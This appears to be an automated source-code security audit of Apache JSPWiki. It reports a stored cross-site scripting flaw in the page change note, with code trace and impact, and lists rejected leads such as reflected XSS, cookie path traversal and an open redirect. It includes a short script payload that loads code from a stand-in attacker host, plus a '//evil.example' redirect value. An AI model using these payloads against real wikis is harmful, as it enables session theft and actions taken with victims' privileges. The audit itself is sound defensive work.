candidates.attacker_control: Any user who can edit a page (Edit.jsp requires the page 'edit' permission, Edit.jsp:56-57) can submit an arbitrary `changenote` parameter together with a page save; the `maxlength="80"` on the field is client-side only and Edit.jsp performs no server-side length or character validation. A short payload such as `<script src=//attacker/x.js></script>` fits in the field. Payloads are stored per version and re-rendered for every later viewer.
candidates.counterevidence_checked: Confirmed VersioningFileProvider stores/loads the raw change note per version (no escaping on read). Confirmed `${changenote}` is JSP EL, which does not escape. Confirmed InfoContent is only reached with view permission. Confirmed AttachmentServlet escapes the same-named field for attachments (AttachmentServlet:518-522), so the omission is specific to the page-edit path, not a deliberate design. Checked that page text itself is HTML-escaped by the parser when allowHTML is false, so the change note is not redundant with page-content permissions. Not able to inspect WEB-INF/jspwiki.policy (absent from the snapshot), so the default edit/rename/view grants are inferred, not proven.
candidates.impact: Persistent cross-site scripting in the JSPWiki origin. A low-privileged/anonymous editor can run script in the browsers of all users who view the page's Info tab, including administrators; this allows theft of session data/CSRF tokens and performing authenticated actions with the victim's privileges (the Info/rename/delete UI and wiki session are same-origin and cookie-based). The default `jspwiki.translatorReader.allowHTML=false` escaping of page text makes this metadata-only injection path more significant, since ordinary wiki content cannot be used for HTML injection by default.
candidates.prerequisites: 1) Edit permission on at least one page (JSPWiki's default policy is commonly permissive, but jspwiki.policy is not present in this snapshot so the exact default grant set could not be verified). 2) A victim viewing that page's Info tab (`PageInfo.jsp?page=...`), which by design requires only 'view' permission (PageCommand.java:56-57). 3) No deployment-specific SpamFilter pattern blocking script-like text (no default spam patterns are configured in the shipped ini file).
candidates.root_cause: The edit flow reads the `changenote` form field without any neutralization and stores it as the page's per-version `WikiPage.CHANGENOTE` attribute (Edit.jsp:73, 161-170 -> WikiEngine.saveText:1723-1766 -> SaveWikiPageTask:51-58 -> VersioningFileProvider:519-523, 618-619). The default template then emits that value with JSP EL `${changenote}` inside plain HTML text (templates/default/InfoContent.jsp:206-207). JSP EL does not HTML-escape, so markup/script in the change note becomes live HTML in the wiki origin. The same field is deliberately escaped on the attachment-upload path (AttachmentServlet:518-522 uses TextUtil.replaceEntities), but the page-edit path has no equivalent escaping, and InfoContent's own author value *is* escaped, showing the omission is an escaping defect rather than intended raw content.
candidates.title: Stored XSS via unescaped page ChangeNote in default InfoContent template
candidates.trace: Request parameter changenote -> Edit.jsp:73 (findParam, no escaping) -> Edit.jsp:161-170 modifiedPage.setAttribute(WikiPage.CHANGENOTE, changenote) -> WikiEngine.saveText:1723-1766 -> SaveWikiPageTask:58 PageManager.putPageText(page, text) -> VersioningFileProvider:519-523 writes '<version>.changenote' into the version property file -> later reads set WikiPage.CHANGENOTE (VersioningFileProvider:618-619) -> <wiki:HistoryIterator id=currentPage> + <c:set var="changenote"> + raw EL output at templates/default/InfoContent.jsp:206-207 -> script executes in the wiki origin in the victim's browser.
candidates.unverified: No runtime reproduction (no code executed, per rules). The exact default permission policy is not in the snapshot (no jspwiki.policy file), so the claim that anonymous/unauthenticated users can edit depends on deployment policy, not on a file I could read. I did not verify whether a deployment's SpamFilter configuration (absent by default here) would reject the payload. Line-length claims rely on reading the server-side code, not on running the app.
candidates.weakness_type: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') - stored

coverage_summary: Source scope: 1,155 repository files (no exclusions/symlinks reported; binary-like files skipped by the tooling). I inspected the Java core broadly: authentication/authorization/ACL (AuthenticationManager, AuthorizationManager, WikiSession, login modules, DefaultAclManager, user databases), attachment servlet/manager/providers, markup parser and link parser, plugin manager and core plugins, ajax/servlet filters, URL constructors, RSS/Atom/XML-RPC, and the web.xml/ini configuration; plus the JSP/servlet surface under jspwiki-war (default and 210 templates, top-level JSPs) and the it-test web.xml variants. P1 relation index coverage was partial: 1,018 of 1,155 source files indexed (137 missing), 5,432 symbols, syntactic call/containment hints only, no control-flow, data-flow, or semantic resolution, and Spring annotation facts are name-based only. I used the index to navigate and verified every cited edge in source text. The snapshot contains no unit tests and no jspwiki.policy file, which limits verification of default permissions; no runtime execution, deployment scanning, or exploit testing was performed.
limitations: No runtime reproduction was performed (rules prohibit executing code/tests/scanners); findings are source-evidence leads, not confirmed vulnerabilities.

WEB-INF/jspwiki.policy is absent from the snapshot, so the default permission grants (edit/view/rename/upload for anonymous, asserted and authenticated users) could not be verified; the stored-XSS prerequisites partly depend on that policy.
No unit tests are present in the snapshot, so intended-escaping behavior could not be cross-checked against tests.

The P1 index omits 137 source files from indexing and provides only syntactic candidate relations (no control-flow, data-flow, taint, runtime reachability, or semantic resolution); unindexed areas were not assumed to be clean.
JSP files are not covered by the Java relation index; only the webapp files I read directly were reviewed.

The exact scope of vulnerability handling for JSP-less deployments (embedded JSPWiki, headless API usage) was not verified; impact statements assume the standard WAR with the default 'default' template.

rejected_leads.lead: Reflected XSS via the `renameto` request parameter in the same default template (default/InfoContent.jsp:42-43, 126 -> raw `<%= parm_renameto %>` inside `value="..."`), also present in templates/210/InfoContent.jsp:44-45,146.
rejected_leads.reason: Real unescaped request->HTML flow, but it is gated by `<wiki:Permission permission="rename">` (InfoContent.jsp:115) and is only reflected on a crafted link, so lower impact/persistence than the stored ChangeNote issue; not submitted separately due to the one-candidate cap.

rejected_leads.lead: Attachment file name rendered unescaped in templates/default/AttachmentTab.jsp (${att.fileName} at line 124 and 137) and InfoContent.jsp:343; validateFileName only strips # ? " ' (AttachmentManager:637-679), so '<' '>' survive.
rejected_leads.reason: Plausible stored XSS, but requires upload permission and attribute-context break-out is blocked by the quote stripping; text-context chain depends on LinkTo tag body handling I did not fully verify.

rejected_leads.lead: CookieAuthenticationLoginModule reads the JSPWikiUID cookie value directly as a relative file name (getCookieFile -> new File(cookieDir, uid), CookieAuthenticationLoginModule:111-124, 175-215), allowing path traversal to any readable file whose content then becomes the authenticated login name.
rejected_leads.reason: Strong-looking auth-bypass candidate, but `jspwiki.cookieAuthentication` defaults to false (AuthenticationManager:193-196; ini comment 'By default, cookie authentication is off'), so it is not reachable in the default configuration and requires a username-only file reachable by relative path.

rejected_leads.lead: AtomAPIServlet.doPost performs page writes with an explicit '//FIXME: Do authentication here' and no permission check (AtomAPIServlet:111-161).
rejected_leads.reason: The ATOM and XML-RPC servlet mappings are commented out in the shipped web.xml (jspwiki-war/.../web.xml:176-191), so this is not reachable in the default configuration.

rejected_leads.lead: Open redirect via the `nextpage` parameter (AttachmentServlet:303-304, 434-449, 524-527): validateNextPage only rejects strings containing '://', so '//evil.example' passes and is passed to sendRedirect.
rejected_leads.reason: In doGet the redirect is attempted after the attachment body has already been streamed (likely committed response); only the multipart doPost path is a working open redirect, and it requires upload permission. Moderate impact only; not selected.

rejected_leads.lead: Denounce plugin emits unescaped ''+text+'' (Denounce.java:167), and AJAXPreview.jsp:43-45 renders arbitrary request-supplied wikimarkup with only view permission.
rejected_leads.reason: Would be a nice unauthenticated reflected XSS chain, but plugin argument parsing (DefaultPluginManager.parseArgs:385-475) tokenizes with StreamTokenizer defaults and does not appear to preserve quotes/attribute-breaking characters, so I could not establish a working payload from source; unconfirmed.

rejected_leads.lead: DefaultPluginManager.parseArgs lacks an explicit quoteChar('\'') while switching on case '\'' (DefaultPluginManager:397-441).
rejected_leads.reason: Looks like a functional parsing bug (single-quoted plugin args), not a security issue with demonstrable impact; possibly an upstream quirk.

rejected_leads.lead: XMLUserDatabase/XMLGroupDatabase parse XML with DocumentBuilderFactory without disallowing DOCTYPE/external entities (XMLUserDatabase:304-310, XMLGroupDatabase:257-263).
rejected_leads.reason: XXE-style parsing exists, but the parsed files are local WEB-INF config files configured by the administrator, not attacker-supplied input; no remote entity-injection path was found.

rejected_leads.lead: ReferenceManager deserializes Java objects from a work-directory file (ReferenceManager:327, 417) and Serializer.deserializeFromBase64 is applied to user-database attributes (XMLUserDatabase:685, JDBCUserDatabase:744).
rejected_leads.reason: Deserialization sinks exist, but the inputs are server-local files/records that an external attacker cannot write under default configuration; not a supported remote vector from source evidence.

rejected_leads.lead: Login throttling computes `1<<count` (AuthenticationManager:429-446), which goes negative for count==31 and can make Thread.sleep throw an unchecked exception.
rejected_leads.reason: Requires 31 prior failed logins for the same user name (with exponential 20 s delays) to cause a single failed request; minor DoS at best.

summary: JSPWiki 2.11.0.M3-RC2 (Apache JSPWiki) review. I inspected the Java core (auth, ACL, attachment servlet, providers, plugin/parser, ajax, rpc, filters), the default and legacy JSP template families, the shipped web.xml/ini configuration, and the it-test descriptors, and used the P1 relation index only for navigation. The strongest distinct issue I can defend from source is a stored XSS in the default template: the page ChangeNote is accepted unescaped in the edit flow, persisted per page version, and rendered raw by `templates/default/InfoContent.jsp` (`${changenote}`), which is reachable with only view permission (`PageCommand.INFO`). Several other plausible leads are listed as unconfirmed/rejected below because only one candidate may be submitted.
